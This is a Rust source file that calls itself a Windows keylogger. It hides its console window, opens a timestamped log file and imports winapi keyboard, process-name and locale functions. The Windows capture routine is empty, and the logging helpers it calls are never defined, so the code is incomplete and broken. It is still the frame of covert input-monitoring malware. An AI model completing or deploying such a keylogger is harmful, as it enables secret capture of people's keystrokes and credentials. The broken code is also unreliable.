#![windows_subsystem = "windows"]




#[cfg(windows)]
extern crate winapi;


use std::fs::*;
use std::io::*;

use chrono::{DateTime, Timelike, Utc};






#[cfg(not(windows))]
fn run(file: &mut File) {
    log_header(file);
    log(file, "This keylogger only works on windows".to_string());
}


#[cfg(windows)]
fn run(file: &mut File) {
    use winapi::um::winuser::*;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    use winapi::um::winnls::GetUserDefaultLocaleName;
    use winapi::shared::minwindef::DWORD;
    use winapi::ctypes::c_int;
    use std::{thread, time::Duration};
}

fn main() {
    let now: DateTime<Utc> = Utc::now();
    let filename = format!("log-{}-{:02}+{:02}+{:02}.log", now.date(), now.hour(), now.minute(), now.second());

    let mut output = {
        match OpenOptions::new().write(true).create(true).open(&filename) {
            Ok(f) => { f }

            Err(e) => {
                panic!("Couldn't create Output file: {}", e);
            }
        }
    };

    run(&mut output);
}













